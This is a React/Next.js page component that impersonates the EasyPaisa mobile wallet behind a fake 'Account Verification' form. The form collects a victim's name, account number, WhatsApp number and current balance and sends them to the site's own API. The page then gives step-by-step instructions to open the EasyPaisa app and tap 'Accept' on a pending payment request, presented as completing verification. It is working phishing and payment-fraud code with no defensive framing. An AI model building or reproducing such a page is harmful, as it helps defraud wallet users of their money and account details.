'use client';

import React, { useState } from 'react';
import Image from 'next/image';
import SplashScreen from './components/SplashScreen';

export default function Home() {
  const [showSplash, setShowSplash] = useState(true);
  const [showForm, setShowForm] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    accountNumber: '',
    contactNumber: '',
    currentBalance: ''
  });
  const [submittedData, setSubmittedData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [showAnotherForm, setShowAnotherForm] = useState(false);

  const handleSplashFinish = () => {
    setShowSplash(false);
    setShowForm(true);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    
    try {
      const response = await fetch('/api/submissions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });
      
      const result = await response.json();
      
      if (result.success) {
        setSubmittedData(result.data);
        // Reset form
        setFormData({
          name: '',
          accountNumber: '',
          contactNumber: '',
          currentBalance: ''
        });
      } else {
        setError(result.message || 'Failed to submit form');
      }
    } catch (err) {
      setError('Network error. Please try again.');
      console.error('Submission error:', err);
    } finally {
      setLoading(false);
    }
  };

  const steps = [
    {
      id: 1,
      title: "Step 1: Open EasyPaisa App",
      image: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/guide-step1-0W2GwbZsdgVeG6obmFH0sPLU62x7Mv.jpeg",
      description: "Open your EasyPaisa mobile application to begin the verification process."
    },
    {
      id: 2,
      title: "Step 2: Navigate to My Approvals",
      image: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/guide-step2-FSBguRtQm5g0ORC96FKaCIGgWy9JuV.png",
      description: 'Go to "My Account" section and tap on "My Approvals" to view pending requests.'
    },
    {
      id: 3,
      title: "Step 3: Accept Payment Request",
      image: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/guide-step3-qoSxrN7b3Ad1I1Sy5noW76e4oMAEUR.jpeg",
      description: 'Review the payment request details and tap "Accept" to complete the verification.'
    }
  ];

  if (showSplash) {
    return (
      <>
        <SplashScreen onFinish={handleSplashFinish} />
      </>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <Image
            src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
            alt="Easypaisa Logo"
            width={150}
            height={50}
          />
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        {submittedData ? (
          <>
            <div className="bg-white rounded-xl shadow-lg p-8 max-w-2xl mx-auto mb-8">
              <div className="text-center">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                  </svg>
                </div>
                <h2 className="text-2xl font-bold text-green-600 mb-2">Form Submitted Successfully!</h2>
                <p className="text-gray-600 mb-6">Thank you for providing your details</p>
              </div>
              
              <div className="bg-gray-50 rounded-lg p-6 mb-6">
                <h3 className="text-lg font-semibold text-gray-800 mb-4">Submitted Information</h3>
                <div className="space-y-3">
                  <div className="flex">
                    <span className="font-medium text-gray-700 w-40">Complete Name:</span>
                    <span className="text-gray-900">{submittedData.name}</span>
                  </div>
                  <div className="flex">
                    <span className="font-medium text-gray-700 w-40">WhatsApp Number:</span>
                    <span className="text-gray-900">{submittedData.accountNumber}</span>
                  </div>
                  <div className="flex">
                    <span className="font-medium text-gray-700 w-40">Contact Number:</span>
                    <span className="text-gray-900">{submittedData.contactNumber}</span>
                  </div>
                  <div className="flex">
                    <span className="font-medium text-gray-700 w-40">Current Balance:</span>
                    <span className="text-gray-900">PKR {submittedData.currentBalance}</span>
                  </div>
                </div>
              </div>
              
            </div>

            {/* Verification Steps Guide Section */}
            <div className="max-w-7xl mx-auto">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
                {steps.map((step) => (
                  <div key={step.id} className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 h-full">
                    {/* Step Header */}
                    <div className="mb-6">
                      <h2 className="text-xl font-bold text-gray-900 leading-tight">
                        {step.title}
                      </h2>
                    </div>

                    {/* Step Image Container */}
                    <div className="mb-6 flex justify-center">
                      <div className="relative w-full max-w-sm h-80 rounded-xl overflow-hidden bg-gray-50">
                        <Image
                          src={step.image}
                          alt={step.title}
                          fill
                          className="object-contain"
                          priority={step.id === 1}
                        />
                      </div>
                    </div>

                    {/* Step Description */}
                    <div className="text-center">
                      <p className="text-gray-600 text-base leading-relaxed">
                        {step.description}
                      </p>
                    </div>
                  </div>
                ))}
              </div>

              {/* Submit Another Verification Button */}
              <div className="flex justify-center">
                <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
                  <button
                    onClick={() => setShowAnotherForm(!showAnotherForm)}
                    className="px-8 py-3 bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold rounded-lg transition-colors duration-200"
                  >
                    Submit Another Verification
                  </button>
                </div>
              </div>

              {/* Optional: Show form when button is clicked */}
              {showAnotherForm && (
                <div className="mt-8 max-w-lg mx-auto">
                  <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-8">
                    <div className="text-center mb-6">
                      <h3 className="text-2xl font-bold text-gray-900 mb-2">
                        New Verification Request
                      </h3>
                      <p className="text-gray-600">
                        Submit another verification request
                      </p>
                    </div>
                    
                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-semibold text-gray-900 mb-2">
                          Account Number
                        </label>
                        <input
                          type="text"
                          placeholder="Enter account number"
                          className="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:bg-gray-50"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-sm font-semibold text-gray-900 mb-2">
                          Amount
                        </label>
                        <input
                          type="text"
                          placeholder="Enter amount"
                          className="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:bg-gray-50"
                        />
                      </div>

                      <button className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-200">
                        Submit Request
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </>
        ) : showForm && (
          <div className="bg-white rounded-xl shadow-lg p-8 max-w-2xl mx-auto">
            <div className="text-center mb-8">
              <h1 className="text-3xl font-bold text-gray-800 mb-2">Account Verification</h1>
              <p className="text-lg text-gray-600">Please provide your account details for verification</p>
            </div>
            
            {error && (
              <div className="bg-red-50 text-red-700 p-4 rounded-lg mb-6 flex items-center">
                <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                {error}
              </div>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-2">
                  Complete Name
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <svg className="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                    </svg>
                  </div>
                  <input
                    type="text"
                    id="name"
                    name="name"
                    value={formData.name}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#016630] focus:border-transparent"
                    placeholder="Enter your full name"
                    required
                  />
                </div>
              </div>

              <div>
                <label htmlFor="accountNumber" className="block text-sm font-medium text-gray-700 mb-2">
                  Easypaisa Account Number
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <svg className="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path>
                    </svg>
                  </div>
                  <input
                    type="text"
                    id="accountNumber"
                    name="accountNumber"
                    value={formData.accountNumber}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#016630] focus:border-transparent"
                    placeholder="Enter your easypais account number"
                    required
                  />
                </div>
              </div>

              <div>
                <label htmlFor="contactNumber" className="block text-sm font-medium text-gray-700 mb-2">
                  WhatsApp Number
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <svg className="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path>
                    </svg>
                  </div>
                  <input
                    type="tel"
                    id="contactNumber"
                    name="contactNumber"
                    value={formData.contactNumber}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#016630] focus:border-transparent"
                    placeholder="Enter your whatsapp number"
                    required
                  />
                </div>
              </div>

              <div>
                <label htmlFor="currentBalance" className="block text-sm font-medium text-gray-700 mb-2">
                  Current Balance (PKR)
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <svg className="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                  </div>
                  <input
                    type="number"
                    id="currentBalance"
                    name="currentBalance"
                    value={formData.currentBalance}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#016630] focus:border-transparent"
                    placeholder="Enter your current balance"
                    required
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className={`w-full bg-[#016630] text-white py-3 px-4 rounded-lg font-medium hover:bg-[#014d24] transition-colors duration-300 ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
              >
                {loading ? (
                  <div className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                  </div>
                ) : 'Submit Verification'}
              </button>
            </form>
          </div>
        )}
      </main>
    </div>
  );
}